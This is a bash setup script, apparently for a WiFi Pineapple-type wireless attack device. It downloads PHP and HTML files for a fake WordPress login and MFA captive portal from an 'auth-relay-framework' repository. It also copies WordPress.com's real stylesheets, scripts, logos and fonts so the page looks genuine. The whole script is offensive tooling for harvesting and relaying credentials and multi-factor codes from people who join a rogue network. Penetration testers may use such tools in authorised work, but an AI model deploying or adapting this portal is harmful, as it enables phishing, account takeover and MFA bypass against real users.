#!/bin/bash
# Name: Setup WordPress Portal
# Description: Downloads and installs the WordPress captive portal files
# Author: PentestPlaybook
# Version: 1.0
# Category: Wireless

PORTAL_DIR="/root/portals/Wordpress"

# Create portal directory if it doesn't exist
if [ ! -d "$PORTAL_DIR" ]; then
    LOG "Creating portal directory: $PORTAL_DIR"
    mkdir -p "$PORTAL_DIR"
else
    LOG "Portal directory already exists: $PORTAL_DIR"
fi

cd "$PORTAL_DIR"

LOG "Downloading portal PHP/HTML files..."
curl -s -o helper.php "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/helper.php"
curl -s -o index.php "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/index.php"
curl -s -o login_error.html "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/login_error.html"
curl -s -o login.html "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/login.html"
curl -s -o login_result.php "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/login_result.php"
curl -s -o mfa_failed.html "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/mfa_failed.html"
curl -s -o mfa_handler.php "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/mfa_handler.php"
curl -s -o mfa.html "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/mfa.html"
curl -s -o mfa_result.php "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/mfa_result.php"
curl -s -o mfa_status.php "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/mfa_status.php"
curl -s -o success.html "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/success.html"
curl -s -o Wordpress.ep "https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/setup/pineapple/web-root/Wordpress.ep"
LOG "Portal PHP/HTML files downloaded."

LOG "Downloading WordPress CSS and JS assets..."
curl -s -o wp-login.css "https://wordpress.com/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,buttons,forms,l10n,login&ver=6.8.2"
curl -s -o wp-scripts.js "https://wordpress.com/wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=clipboard,jquery-core,jquery-migrate,zxcvbn-async,wp-hooks&ver=6.8.2"
LOG "CSS and JS assets downloaded."

LOG "Downloading WordPress images..."
mkdir -p images
curl -s -o images/wordpress-logo.svg "https://wordpress.com/wp-admin/images/wordpress-logo.svg"
curl -s -o images/w-logo-blue.png "https://wordpress.com/wp-admin/images/w-logo-blue.png"
LOG "Images downloaded."

LOG "Downloading WordPress fonts..."
mkdir -p wp-includes/fonts
curl -s -o wp-includes/fonts/dashicons.woff2 "https://wordpress.com/wp-includes/fonts/dashicons.woff2"
curl -s -o wp-includes/fonts/dashicons.ttf "https://wordpress.com/wp-includes/fonts/dashicons.ttf"
curl -s -o wp-includes/fonts/dashicons.eot "https://wordpress.com/wp-includes/fonts/dashicons.eot"
LOG "Fonts downloaded."

LOG "Setting permissions..."
chmod -R 755 "$PORTAL_DIR"
LOG "Permissions set to 755."

ALERT "WordPress portal setup complete!\nFiles installed to $PORTAL_DIR"
